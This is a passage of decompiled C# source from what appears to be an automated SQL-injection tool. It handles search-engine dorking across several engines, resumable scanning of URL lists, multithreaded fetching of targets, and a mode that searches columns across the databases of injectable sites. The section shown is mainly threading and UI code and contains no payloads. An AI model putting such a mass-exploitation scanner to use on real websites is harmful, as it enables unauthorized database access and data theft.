				lstSearchEngine.Visible = bool_5;
				if (bool_5)
				{
					grbDorks.Height += 25;
				}
				else
				{
					grbDorks.Height -= 25;
				}
				btnSearchFilter.Enabled = bool_5;
				txtSearchFilter.Enabled = bool_5 & btnSearchFilter.Checked;
			}
			if (enum6_0 == Enum6.const_4)
			{
				prbSearchColumn.Value = 0;
				prbSearchColumn.Visible = !bool_5;
				prbSearchColumn.Style = ProgressBarStyle.Blocks;
				chkSearchColumn.Enabled = bool_5;
				chkSearchColumn2.Enabled = bool_5;
				chkSearchColumn3.Enabled = bool_5;
				chkSearchColumn4.Enabled = bool_5;
				cmbSearchColumn.Enabled = bool_5;
				cmbSearchColumn2.Enabled = bool_5;
				cmbSearchColumn3.Enabled = bool_5;
				cmbSearchColumn4.Enabled = bool_5;
				cmbSearchColumnType.Enabled = bool_5;
				chkSearchColumnAllDBs.Enabled = bool_5;
				btnSearchColumnStart.Enabled = bool_5 & (dtgSQLi.SelectedRows.Count > 0);
				btnSearchColumnStart.Visible = bool_5;
				btnSearchColumnPause.Visible = !bool_5;
				btnSearchColumnSP.Visible = !bool_5;
				btnSearchColumnStop.Visible = !bool_5;
				btnSearchColumnStop.Enabled = !bool_5;
				btnSearchColumnPause.Enabled = !bool_5;
				tsWorker.Visible = bool_5;
				if (bool_5)
				{
					Globals.GMain.Controls.Remove(tsSearchColumn);
					pnlSQLi.Controls.Add(tsSearchColumn);
				}
				else
				{
					pnlSQLi.Controls.Remove(tsSearchColumn);
					Globals.GMain.Controls.Add(tsSearchColumn);
				}
				stMain.SendToBack();
			}
			else
			{
				prbMainStatus.Value = 0;
				prbMainStatus.Visible = !bool_5;
				prbMainStatus.Style = ProgressBarStyle.Blocks;
				tsSearchColumn.Visible = bool_5;
			}
			btnSettingReset.Enabled = bool_5;
			btnSettingReLoad.Enabled = bool_5;
			Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	private void method_19()
	{
		string_0 = Class50.smethod_5(base.Name, "URL_List_Path", "");
		int_0 = Conversions.ToInteger(Class50.smethod_5(base.Name, "URL_List_Line", "1"));
		if (int_0 <= 1)
		{
			return;
		}
		if (File.Exists(string_0))
		{
			using (new Class8(this))
			{
				if (MessageBox.Show("It looks like the previous exploithing text file crashed: \r\n" + string_0 + "\r\n\r\nWorking on line index: " + Globals.FormatNumbers(int_0) + "\r\n\r\nDo you want to continue to work?", "Confirme", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1) == DialogResult.Yes)
				{
					twMain.SelectedNode = treeNode_4;
					method_10(null, null);
				}
			}
		}
		Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(0));
	}

	private bool method_20()
	{
		string text = "";
		string_0 = Class50.smethod_5(base.Name, "URL_List_Path", "");
		int_0 = Conversions.ToInteger(Class50.smethod_5(base.Name, "URL_List_Line", "1"));
		string text2 = "";
		string text3 = "";
		if (!string.IsNullOrEmpty(string_0))
		{
			text2 = Path.GetDirectoryName(string_0);
			if (Directory.Exists(text2))
			{
				if (File.Exists(string_0))
				{
					text3 = Path.GetFileName(string_0);
				}
				else
				{
					int_0 = 1;
				}
			}
			else
			{
				text2 = "";
				int_0 = 1;
			}
		}
		else
		{
			int_0 = 1;
		}
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			if (Directory.Exists(text2))
			{
				openFileDialog.InitialDirectory = text2;
			}
			else
			{
				openFileDialog.InitialDirectory = Globals.APP_PATH;
			}
			if (!string.IsNullOrEmpty(text3))
			{
				openFileDialog.FileName = text3;
			}
			openFileDialog.Title = Globals.translate_0.GetStr(this, 14);
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return false;
			}
			string_0 = openFileDialog.FileName;
			Class50.smethod_4(base.Name, "URL_List_Path", openFileDialog.FileName);
		}
		method_1(Globals.translate_0.GetStr(this, 13) + string_0);
		Application.DoEvents();
		int_4 = method_86(string_0);
		method_1("");
		text = "File: " + string_0 + "\r\nLines Count: " + Globals.FormatNumbers(int_4) + "\r\n\r\nFirt 1k Lines: \r\n" + method_87(string_0);
		checked
		{
			using OpenFilePreview openFilePreview = new OpenFilePreview();
			openFilePreview.Text = Globals.translate_0.GetStr(this, 15);
			openFilePreview.txtPreview.Text = text;
			openFilePreview.numLineIndex.Maximum = new decimal(int_4 - 1);
			if ((int_0 > 0) & (int_0 < int_4 - 1))
			{
				openFilePreview.numLineIndex.Value = new decimal(int_0);
			}
			if (openFilePreview.ShowDialog(this) == DialogResult.OK)
			{
				int_0 = Convert.ToInt32(openFilePreview.numLineIndex.Value);
				return true;
			}
			return false;
		}
	}

	internal Enum6 method_21()
	{
		return enum6_0;
	}

	private bool method_22(int int_14 = -1)
	{
		if (base.InvokeRequired)
		{
			return Conversions.ToBoolean(Invoke((Delegate45)([SpecialName] [DebuggerHidden] () => method_22())));
		}
		if (enum6_0 == Enum6.const_4)
		{
			switch (int_14)
			{
			case 1:
				btnSearchColumnPause.Checked = true;
				break;
			case 0:
				btnSearchColumnPause.Checked = false;
				break;
			}
			return btnSearchColumnPause.Checked & !bcWorker.CancellationPending;
		}
		switch (int_14)
		{
		case 1:
			btnPause.Checked = true;
			break;
		case 0:
			btnPause.Checked = false;
			break;
		}
		return btnPause.Checked & !(bcWorker.CancellationPending | !Globals.NETWORK_AVAILABLE);
	}

	internal bool method_23()
	{
		if (threadPool_0 != null && threadPool_0.Status == ThreadPool.ThreadStatus.Stopped)
		{
			return true;
		}
		if (enum6_0 == Enum6.const_0)
		{
			return true;
		}
		if (method_22())
		{
			if (_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init == null)
			{
				Interlocked.CompareExchange(ref _0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init, new StaticLocalInitFlag(), null);
			}
			bool lockTaken = false;
			try
			{
				Monitor.Enter(_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init, ref lockTaken);
				if (_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init.State == 0)
				{
					_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init.State = 2;
					_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl = false;
				}
				else if (_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init.State = 1;
				if (lockTaken)
				{
					Monitor.Exit(_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl_0024Init);
				}
			}
			if (_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl)
			{
				while (method_22())
				{
					Thread.Sleep(10);
					Application.DoEvents();
				}
				_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl = false;
			}
			else
			{
				_0024STATIC_0024PausedOrCanceled_00242002_0024bPauseControl = true;
				if (enum6_0 == Enum6.const_1)
				{
					foreach (SearchEngine value in dictionary_0.Values)
					{
						value.PauseScanning(state: true);
					}
				}
				if (threadPool_0 != null)
				{
					threadPool_0.Paused = true;
				}
				Globals.G_Taskbar.SetProgressState(ProgressBarState.Paused);
				while (method_22())
				{
					Thread.Sleep(10);
					Application.DoEvents();
				}
				if (threadPool_0 != null)
				{
					threadPool_0.Paused = false;
				}
				Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
				if (enum6_0 == Enum6.const_1)
				{
					foreach (SearchEngine value2 in dictionary_0.Values)
					{
						value2.PauseScanning(state: false);
					}
				}
				if (enum6_0 == Enum6.const_1)
				{
				}
			}
		}
		return bcWorker.CancellationPending;
	}

	private void method_24(Exception exception_0)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 144:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_002d;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
						case 8:
						case 9:
						case 10:
						case 11:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0013:
					num = 3;
					if (!Boolean_1)
					{
						goto end_IL_0001_3;
					}
					goto IL_001d;
					IL_001d:
					num = 4;
					if (exception_0 is ThreadAbortException)
					{
						goto end_IL_0001_3;
					}
					goto IL_002d;
					IL_000a:
					num = 2;
					if (!Debugger.IsAttached)
					{
						goto end_IL_0001_3;
					}
					goto IL_0013;
					IL_002d:
					num = 5;
					if (bcWorker.CancellationPending)
					{
						goto end_IL_0001_3;
					}
					break;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Interaction.MsgBox(exception_0.ToString());
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 144;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private string[] method_25()
	{
		if (dtgQueue.InvokeRequired)
		{
			return (string[])dtgQueue.Invoke(new Delegate46(method_25));
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow item in (IEnumerable)dtgQueue.Rows)
		{
			list.Add(Conversions.ToString(item.Cells[0].Value));
		}
		return list.ToArray();
	}

	private void method_26(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				if (enum6_0 != Enum6.const_1)
				{
					AppControlDomain = new AppDomainControl();
				}
				if (enum6_0 == Enum6.const_1)
				{
					foreach (Globals.SearchHost key in dictionary_0.Keys)
					{
						Thread thread = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
						{
							method_30(unchecked((Globals.SearchHost)Conversions.ToByte(object_0)));
						});
						thread.IsBackground = true;
						thread.Start(key);
					}
					while (true)
					{
						method_32();
						if (method_31() || method_23())
						{
							break;
						}
						Thread.Sleep(2000);
					}
				}
				else if (enum6_0 == Enum6.const_2)
				{
					method_1(Globals.translate_0.GetStr(this, 17));
					int num = int_2;
					string[] array = method_25();
					if (num > array.Length)
					{
						num = array.Length;
					}
					threadPool_0 = new ThreadPool(num);
					if (array.Length == 1)
					{
						method_29(ProgressBarStyle.Marquee);
					}
					int num2 = array.Length - 1;
					int_0 = 0;
					while (int_0 <= num2)
					{
						if (!method_23())
						{
							int_1 = (int)Math.Round(Math.Round((double)(100 * (int_0 + 1)) / (double)(array.Length + threadPool_0.ThreadCount)));
							bcWorker.ReportProgress(int_1);
							if (array.Length > 1)
							{
								method_1("[" + Globals.FormatNumbers(int_0 + 1) + " | " + Globals.FormatNumbers(array.Length) + "] " + Conversions.ToString(int_1) + "% " + Globals.translate_0.GetStr(this, 18) + " " + struct10_0.method_0());
							}
							else
							{
								method_1(Globals.translate_0.GetStr(this, 18) + " " + struct10_0.method_0());
							}
							try
							{
								Thread thread2 = null;
								Class25 @class = new Class25();
								@class.String_0 = array[int_0];
								thread2 = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
								{
									method_36((Class25)object_0);
								});
								thread2.Name = "Pos : " + Conversions.ToString(int_0);
								@class.Thread = thread2;
								@class.Index = int_0;
								thread2.Start(@class);
								threadPool_0.Open(thread2);
								threadPool_0.WaitForThreads();
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(50);
							int_0++;
							continue;
						}
						threadPool_0.AbortThreads();
						break;
					}
				}
				else if (enum6_0 == Enum6.const_3)
				{
					int num3 = int_2;
					if (num3 > int_4)
					{
						num3 = int_4;
					}
					threadPool_0 = new ThreadPool(num3);
					FileInfo fileInfo = new FileInfo(string_0);
					int num4 = 0;
					using (StreamReader streamReader = fileInfo.OpenText())
					{
						while (!streamReader.EndOfStream)
						{
							if (num4 < int_0)
							{
								if (unchecked(num4 % 10000) == 0)
								{
									method_1(Globals.translate_0.GetStr(this, 19) + " " + Globals.FormatNumbers(num4 - int_0));
									if (method_23())
									{
										break;
									}
								}
								streamReader.ReadLine();
								num4++;
								continue;
							}
							string text = streamReader.ReadLine();
							if (!method_23())
							{
								if (!Class23.smethod_13(text) || Globals.GTrash.method_2(text))
								{
									continue;
								}
								if (int_4 > 1)
								{
									int_1 = (int)Math.Round(Math.Round((double)(100 * (int_0 + 1)) / (double)(int_4 + threadPool_0.ThreadCount)));
									bcWorker.ReportProgress(int_1);
									method_1("[" + Globals.FormatNumbers(int_0 + 1) + " | " + Globals.FormatNumbers(int_4) + "] " + Conversions.ToString(int_1) + "% " + Globals.translate_0.GetStr(this, 18) + " " + struct10_0.method_0());
								}
								else
								{
									method_1(Globals.translate_0.GetStr(this, 20) + text);
								}
								try
								{
									Thread thread3 = null;
									Class25 class2 = new Class25();
									class2.String_0 = text;
									thread3 = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_36((Class25)object_0);
									});
									thread3.IsBackground = true;
									thread3.Name = "Pos : " + Conversions.ToString(int_0);
									class2.Thread = thread3;
									class2.Index = int_0;
									thread3.Start(class2);
									threadPool_0.Open(thread3);
									threadPool_0.WaitForThreads();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								if (unchecked(int_0 % 100) == 0)
								{
									Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(int_0));
								}
								int_0++;
								num4++;
								Thread.Sleep(50);
								continue;
							}
							threadPool_0.AbortThreads();
							streamReader.Close();
							break;
						}
					}
					fileInfo = null;
				}
				else if (enum6_0 == Enum6.const_4)
				{
					int num5 = Conversions.ToInteger(Globals.GetObjectValue(numSearchColumnThreads));
					if (num5 > list_2.Count)
					{
						num5 = list_2.Count;
					}
					threadPool_0 = new ThreadPool(num5);
					int retry = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
					bool currentDB = !Conversions.ToBoolean(Globals.GetObjectValue(chkSearchColumnAllDBs));
					if (list_2.Count == 1)
					{
						method_29(ProgressBarStyle.Marquee);
					}
					int num6 = list_2.Count - 1;
					for (int_0 = 0; int_0 <= num6; int_0++)
					{
						if (int_0 > 0)
						{
							int_1 = (int)Math.Round(Math.Round((double)(100 * (int_0 + 1)) / (double)(list_2.Count + threadPool_0.ThreadCount)));
						}
						bcWorker.ReportProgress(int_1);
						foreach (string item in list_1)
						{
							if (!method_23())
							{
								if (num5 > 1)
								{
									if (list_2.Count > 1)
									{
										method_1("[" + Globals.FormatNumbers(int_0 + 1) + " | " + Globals.FormatNumbers(list_2.Count) + "] " + Conversions.ToString(int_1) + "% " + Globals.translate_0.GetStr(this, 22) + " " + Globals.GetObjectValue(cmbSearchColumnType).ToString());
									}
									else
									{
										method_1(Globals.translate_0.GetStr(this, 22) + " " + Globals.GetObjectValue(cmbSearchColumnType).ToString());
									}
								}
								try
								{
									DataGridViewRow dataGridViewRow = list_2[int_0];
									Thread thread4 = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_48((Class49)object_0);
									});
									Class49 class3 = new Class49();
									class3.Int32_0 = int_0;
									class3.Thread = thread4;
									class3.Item = dataGridViewRow;
									class3.String_0 = Conversions.ToString(dataGridViewRow.Cells[1].Value);
									class3.Retry = retry;
									class3.o = null;
									class3.CurrentDB = currentDB;
									class3.Count = list_2.Count;
									class3.Search = item;
									class3.SearchType = checkSearchType_0;
									thread4.Name = "Pos : " + Conversions.ToString(int_0);
									thread4.Start(class3);
									threadPool_0.Open(thread4);
									threadPool_0.WaitForThreads();
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
								}
								Thread.Sleep(50);
								continue;
							}
							threadPool_0.AbortThreads();
							break;
						}
					}
				}
				else if (enum6_0 == Enum6.const_5)
				{
					int num7 = Conversions.ToInteger(Globals.GetObjectValue(numThreads));
					if (num7 > list_2.Count)
					{
						num7 = list_2.Count;
					}
					threadPool_0 = new ThreadPool(num7);
					int retry2 = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
					if (list_2.Count == 1)
					{
						method_29(ProgressBarStyle.Marquee);
					}
					int num8 = list_2.Count - 1;
					int_0 = 0;
					while (int_0 <= num8)
					{
						int_1 = (int)Math.Round(Math.Round((double)(100 * (int_0 + 1)) / (double)(list_2.Count + threadPool_0.ThreadCount)));
						bcWorker.ReportProgress(int_1);
						if (!method_23())
						{
							if (num7 > 1)
							{
								method_1("[" + Globals.FormatNumbers(int_0 + 1) + " | " + Globals.FormatNumbers(list_2.Count) + "] " + Conversions.ToString(int_1) + "% " + Globals.translate_0.GetStr(this, 18) + " " + struct10_0.method_0());
							}
							else
							{
								method_1("[" + Globals.FormatNumbers(int_0 + 1) + " | " + Globals.FormatNumbers(list_2.Count) + "] " + Globals.translate_0.GetStr(this, 18) + " " + struct10_0.method_0());
							}
							try
							{
								DataGridViewRow dataGridViewRow2 = list_2[int_0];
								Thread thread5 = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
								{
									method_46((Class49)object_0);
								});
								Class49 class4 = new Class49();
								class4.Int32_0 = int_0;
								class4.Thread = thread5;
								class4.Item = dataGridViewRow2;
								class4.String_0 = Conversions.ToString(dataGridViewRow2.Cells[1].Value);
								class4.Retry = retry2;
								class4.o = null;
								class4.Count = list_2.Count;
								thread5.Name = "Pos : " + Conversions.ToString(int_0);
								thread5.Start(class4);
								threadPool_0.Open(thread5);
								threadPool_0.WaitForThreads();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							Thread.Sleep(50);
							int_0++;
							continue;
						}
						threadPool_0.AbortThreads();
						break;
					}
				}
				Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
				if (!((enum6_0 != Enum6.const_1) & !bcWorker.CancellationPending))
				{
					return;
				}
				while (true)
				{
					if (enum6_0 != Enum6.const_4)
					{
						if (threadPool_0.ThreadCount > 1)
						{
							if (int_0 > 1)
							{
								method_1("[" + Globals.FormatNumbers(int_0) + " | " + Globals.FormatNumbers(int_0) + "](" + Conversions.ToString(threadPool_0.ThreadCount) + ") " + Globals.translate_0.GetStr(this, 23) + " " + Globals.translate_0.GetStr(this, 24) + struct10_0.method_0());
							}
							else
							{
								method_1(Globals.translate_0.GetStr(this, 23) + " " + Globals.translate_0.GetStr(this, 24) + struct10_0.method_0());
							}
						}
					}
					else if (int_0 > 1)
					{
						method_1("[" + Globals.FormatNumbers(int_0) + " | " + Globals.FormatNumbers(int_0) + "](" + Conversions.ToString(threadPool_0.ThreadCount) + ") " + Globals.translate_0.GetStr(this, 23));
					}
					else
					{
						method_1(Globals.translate_0.GetStr(this, 23));
					}
					if (threadPool_0.ThreadCount == 1)
					{
						method_29(ProgressBarStyle.Marquee);
					}
					if (!method_23() && threadPool_0.ThreadCount != 0)
					{
						Thread.Sleep(1000);
						continue;
					}
					break;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				if (!bcWorker.CancellationPending)
				{
					e.Result = ex2.Message;
					Interaction.Beep();
				}
				ProjectData.ClearProjectError();
			}
			finally
			{
				try
				{
					if (enum6_0 == Enum6.const_3)
					{
						if (int_0 + 1 >= int_4 - 1)
						{
							int_0 = 1;
						}
						Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(int_0));
					}
					if (bcWorker.CancellationPending)
					{
						e.Result = Globals.translate_0.GetStr(this, 16);
					}
					if (AppControlDomain != null)
					{
						AppControlDomain.Terminate();
						AppControlDomain = null;
					}
					Globals.ReleaseMemory();
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					e.Result = ex4.Message;
					Interaction.Beep();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void method_27(object sender, ProgressChangedEventArgs e)
	{
		if (enum6_0 == Enum6.const_4)
		{
			prbSearchColumn.Value = e.ProgressPercentage;
		}
		else
		{
			prbMainStatus.Value = e.ProgressPercentage;
		}
		if (!_0024STATIC_0024bcWorker_ProgressChanged_002420211C12832D_0024IsLoaded)
		{
			_0024STATIC_0024bcWorker_ProgressChanged_002420211C12832D_0024IsLoaded = true;
			Random random = new Random(DateTime.Now.Millisecond);
			if (random.Next(1, 500) == 100 && !Conversions.ToBoolean(Class50.smethod_5(base.Name, "chkOptimizeThread", false.ToString())))
			{
				Globals.GQueue.method_8();
			}
		}
		Globals.G_Taskbar.SetProgressValue(e.ProgressPercentage, 100);
	}

	private void method_28(object sender, RunWorkerCompletedEventArgs e)
	{
		string text = "";
		checked
		{
			try
			{
				bool flag = (enum6_0 == Enum6.const_1) & !e.Cancelled & !bool_2;
				if (enum6_0 == Enum6.const_1)
				{
					if (flag)
					{
						using (new Class8(this))
						{
							MessageBox.Show(lblSearchSummary_2.Text, Globals.translate_0.GetStr(this, 26), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						}
					}
					else
					{
						text = " " + Globals.translate_0.GetStr(this, 79) + Globals.FormatNumbers(Globals.GQueue.method_13().int_0, bIgnoreZero: false);
					}
				}
				else if (enum6_0 == Enum6.const_4)
				{
					if (searchColumn_0 != null)
					{
						searchColumn_0.CanClose = true;
					}
					if (!Information.IsNothing(struct10_0))
					{
						text = ((struct10_0.int_3 <= 0) ? (", " + Globals.translate_0.GetStr(DumperForm, 22)) : (", " + Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount") + " " + Globals.FormatNumbers(struct10_0.int_3, bIgnoreZero: false)));
						struct10_0 = default(Struct10);
					}
				}
				else if (enum6_0 == Enum6.const_5)
				{
					if (!Information.IsNothing(struct10_0))
					{
						text = " " + Globals.translate_0.GetStr(this, 24) + Conversions.ToString(struct10_0.int_3);
					}
				}
				else if (((enum6_0 == Enum6.const_2) | (enum6_0 == Enum6.const_3)) && !Information.IsNothing(struct10_0))
				{
					text = " " + Globals.translate_0.GetStr(this, 24) + struct10_0.method_0();
				}
				if (e.Result != null)
				{
					method_17(e.Result.ToString() + text);
				}
				else
				{
					method_17(Globals.translate_0.GetStr(this, 25) + text);
				}
				if (enum6_0 == Enum6.const_1)
				{
					txtMultiDorks.Clear();
					int num = int_0;
					int num2 = list_0.Count - 1;
					for (int i = num; i <= num2; i++)
					{
						txtMultiDorks.AppendText(list_0[i] + "\r\n");
					}
					txtMultiDorks.SelectionStart = 0;
					txtMultiDorks.SelectionLength = 1;
				}
				if (enum6_0 == Enum6.const_4 && searchColumn_0 != null)
				{
					if (searchColumn_0.lvwData.Items.Count == 0)
					{
						searchColumn_0.Dispose();
					}
					else
					{
						searchColumn_0.CanClose = true;
					}
				}
				if (ReExploiterForm != null)
				{
					ReExploiterForm.CanClose = true;
				}
				int_1 = 0;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.Beep();
				method_17(Globals.translate_0.GetStr(this, 27) + text + "(" + ex2.Message + ")");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_29(ProgressBarStyle progressBarStyle_0)
	{
		if (base.InvokeRequired)
		{
			Invoke(new Delegate47(method_29), progressBarStyle_0);
			return;
		}
		ToolStripProgressBar toolStripProgressBar = ((enum6_0 != Enum6.const_4) ? prbMainStatus : prbSearchColumn);
		if (toolStripProgressBar.Style != progressBarStyle_0)
		{
			toolStripProgressBar.Style = progressBarStyle_0;
			if (progressBarStyle_0 == ProgressBarStyle.Marquee)
			{
				Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
			}
			else
			{
				Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
			}
		}
	}

	private void method_30(Globals.SearchHost searchHost_0)
	{
		checked
		{
			try
			{
				SearchEngine searchEngine = dictionary_0[searchHost_0];
				int num = list_0.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					searchEngine.Percentage = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)list_0.Count));
					searchEngine.StartScanning(list_0[i]);
					searchEngine.DorkIndex = i;
					if (unchecked((0u - (method_23() ? 1u : 0u)) | (uint)(~Int32_2)) != 0)
					{
						break;
					}
					if (!searchEngine.IPS_BLACK_LISTED)
					{
						continue;
					}
					using (new Class8(this))
					{
						if (MessageBox.Show(Globals.translate_0.GetStr(this, 123) + " " + searchHost_0.ToString() + "\r\n" + Globals.translate_0.GetStr(this, 124), Globals.translate_0.GetStr(this, 125), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
						{
							searchEngine.Canceled = true;
							break;
						}
						searchEngine.ClearBlackList();
					}
				}
				searchEngine = null;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				method_24(exception_);
				ProjectData.ClearProjectError();
			}
		}
	}

	private bool method_31()
	{
		bool result = default(bool);
		foreach (SearchEngine value in dictionary_0.Values)
		{
			if (!(result = value.IsComplete()))
			{
				break;
			}
		}
		return result;
	}

	internal void method_32()
	{
		if (dictionary_0 == null || method_23())
		{
			return;
		}
		if (Globals.GMain.InvokeRequired)
		{
			Globals.GMain.Invoke(new Delegate48(method_32));
			return;
		}
		Class37.Struct4 @struct = Globals.GQueue.method_13();
		int num = list_0.Count;
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num2 = default(int);
			foreach (SearchEngine value in dictionary_0.Values)
			{
				stringBuilder.Append(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("\t", Interaction.IIf(value.Canceled, "Canceled ", "")), "["), Globals.FormatNumbers(value.DorkIndex + 1, bIgnoreZero: false).PadLeft(txtMultiDorks.Lines.Length.ToString().Length + 1, ' ')), "] "), value.Percentage.ToString().PadLeft(3, ' ')), "% "), value.Host), " "), Globals.FormatNumbers(value.LinksLoaded)), Interaction.IIf(value.BlackListProxy.Count > 0, " Blocked IPs " + Globals.FormatNumbers(value.BlackListProxy.Count, bIgnoreZero: false), "")), "\r\n"));
				num2 += value.Percentage;
				if (num > value.DorkIndex)
				{
					num = value.DorkIndex;
				}
			}
			lblSearchSummary_1.Text = stringBuilder.ToString();
			int_0 = num;
			lblSearchSummary_2.Text = Globals.translate_0.GetStr(this, 72) + Globals.FormatNumbers(@struct.int_7, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 73) + Globals.FormatNumbers(@struct.int_6, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 74) + Globals.FormatNumbers(@struct.int_1, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 75) + Globals.FormatNumbers(@struct.int_5, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 76) + Globals.FormatNumbers(@struct.int_2, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 77) + Globals.FormatNumbers(@struct.int_3, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 78) + Globals.FormatNumbers(@struct.int_4, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 79) + Globals.FormatNumbers(@struct.int_0, bIgnoreZero: false);
			if (num2 == 0)
			{
				num2 = 1;
			}
			int_1 = (int)Math.Round(Math.Round((double)num2 / (double)dictionary_0.Count));
			bcWorker.ReportProgress(int_1);
			method_1("[" + Globals.FormatNumbers(int_0 + 1, bIgnoreZero: false) + " | " + Globals.FormatNumbers(list_0.Count, bIgnoreZero: false) + "] " + Conversions.ToString(int_1) + "% " + Globals.translate_0.GetStr(this, 80) + Globals.FormatNumbers(@struct.int_0, bIgnoreZero: false));
		}
	}

	private void method_33(object sender, EventArgs e)
	{
		lstSearchEngine.SelectedItem = null;
	}

	private void method_34(object sender, EventArgs e)
	{
		grbDorks.Text = Globals.translate_0.GetStr(this, 81) + Globals.FormatNumbers(txtMultiDorks.Lines.Length);
	}

	private void method_35(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		string[] lines = txtMultiDorks.Lines;
		for (int i = 0; i < lines.Length; i = checked(i + 1))
		{
			string text = lines[i];
			text = text.Trim();
			if (text.Length > 4)
			{
				if (!string.IsNullOrEmpty(stringBuilder.ToString()))
				{
					stringBuilder.AppendLine();
				}
				stringBuilder.Append(text);
			}
		}
		if (!stringBuilder.ToString().Equals(txtMultiDorks.Text))
		{
			txtMultiDorks.Text = stringBuilder.ToString();
		}
	}

	private void method_36(Class25 class25_0)
	{
		try
		{
			string text = "";
			if (!Class23.smethod_13(class25_0.String_0) || Globals.GTrash.method_2(class25_0.String_0))
			{
				return;
			}
			class25_0.HTTP = AppControlDomain.GetHTTP();
			method_42(null, Class23.smethod_11(class25_0.String_0) + " " + Globals.translate_0.GetStr(this, 115), -1);
			int num = Conversions.ToInteger(Globals.GetObjectValue(numHTTPRetry));
			int num2 = default(int);
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				text = class25_0.HTTP.QuickGet(class25_0.String_0);
				num2 = class25_0.HTTP.Status();
				if (!string.IsNullOrEmpty(text))
				{
					break;
				}
				if (num2 > 0)
				{
					text = num2.ToString();
					break;
				}
			}
